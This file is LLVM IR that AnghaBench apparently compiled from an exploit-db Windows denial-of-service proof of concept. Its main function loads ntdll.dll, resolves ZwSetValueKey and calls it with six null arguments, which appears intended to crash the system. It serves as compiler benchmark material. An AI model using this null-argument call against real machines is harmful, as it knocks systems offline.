; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_24411.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_24411.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"ntdll.dll\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"ZwSetValueKey\00", align 1
@MY_NULL = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32 (i32, i32, i32, i32, i32, i32)*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = call i32* @LoadLibrary(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0))
  store i32* %8, i32** %6, align 8
  %9 = icmp ne i32* %8, null
  br i1 %9, label %10, label %25

10:                                               ; preds = %2
  %11 = load i32*, i32** %6, align 8
  %12 = call i64 @GetProcAddress(i32* %11, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  %13 = inttoptr i64 %12 to i32 (i32, i32, i32, i32, i32, i32)*
  store i32 (i32, i32, i32, i32, i32, i32)* %13, i32 (i32, i32, i32, i32, i32, i32)** %7, align 8
  %14 = icmp ne i32 (i32, i32, i32, i32, i32, i32)* %13, null
  br i1 %14, label %15, label %24

15:                                               ; preds = %10
  %16 = load i32 (i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i32)** %7, align 8
  %17 = load i32, i32* @MY_NULL, align 4
  %18 = load i32, i32* @MY_NULL, align 4
  %19 = load i32, i32* @MY_NULL, align 4
  %20 = load i32, i32* @MY_NULL, align 4
  %21 = load i32, i32* @MY_NULL, align 4
  %22 = load i32, i32* @MY_NULL, align 4
  %23 = call i32 %16(i32 %17, i32 %18, i32 %19, i32 %20, i32 %21, i32 %22)
  br label %24

24:                                               ; preds = %15, %10
  br label %25

25:                                               ; preds = %24, %2
  %26 = load i32, i32* %3, align 4
  ret i32 %26
}

declare dso_local i32* @LoadLibrary(i8*) #1

declare dso_local i64 @GetProcAddress(i32*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
